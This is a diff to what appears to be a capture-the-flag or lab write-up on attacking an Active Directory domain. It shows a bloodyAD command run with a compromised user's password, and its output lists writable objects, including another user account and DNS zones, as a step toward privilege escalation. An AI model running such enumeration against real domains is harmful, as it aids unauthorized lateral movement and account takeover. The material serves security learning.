@@ -327,3 +327,24 @@ After changing this users password, i cant seem to authenticate, then i remember
 
 So i have compromise `luke.harrison` as well, looks like he can set the appropriate logon hours, which would make sense since he is part of the account administration group
 
+```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u luke.harrison -p 'Password123' -k get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
+permission: WRITE
+
+distinguishedName: CN=Luke Harrison,CN=Users,DC=hsm-defense,DC=local
+permission: WRITE
+
+distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
+permission: WRITE
+
+distinguishedName: DC=hsm-defense.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hsm-defense,DC=local
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.hsm-defense.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hsm-defense,DC=local
+permission: CREATE_CHILD
+```
+
+As seen here the user `luke.harrison` can write to `jason.caldwell`
+
